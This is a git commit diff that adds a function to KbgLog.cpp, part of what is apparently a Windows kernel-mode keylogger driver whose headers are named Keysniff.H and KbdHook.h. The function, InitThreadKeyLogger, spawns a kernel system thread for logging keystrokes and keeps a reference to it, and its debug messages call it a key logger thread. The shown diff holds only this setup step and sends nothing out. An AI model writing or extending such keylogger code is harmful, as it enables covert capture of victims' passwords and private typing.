7ab5f2a6e1e5961eb0acdb061ecf555a59c0716b
AlSharji0 <asharji1828@gmail.com>
2024-08-25 11:09:13 +0400

    Commit

--- KbgLog.cpp
+++ KbgLog.cpp
@@ -5,3 +5,25 @@ extern "C" {
 #include <kbdmou.h>
 #include "Keysniff.H"
 #include "KbdHook.h"
+
+NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject) {
+	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+
+	pKeyboardDeviceExtension->bThreadTerminate = false;
+	
+	HANDLE hThread;
+	NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtension);
+	
+	if (!NT_SUCCESS(status)) return status;
+
+	DbgPrint("Key logger thread created.\n");
+
+	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);
+	
+	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n", &pKeyboardDeviceExtension->pThreadObj);
+	
+	ZwClose(hThread);
+
+	return status;
+}
+
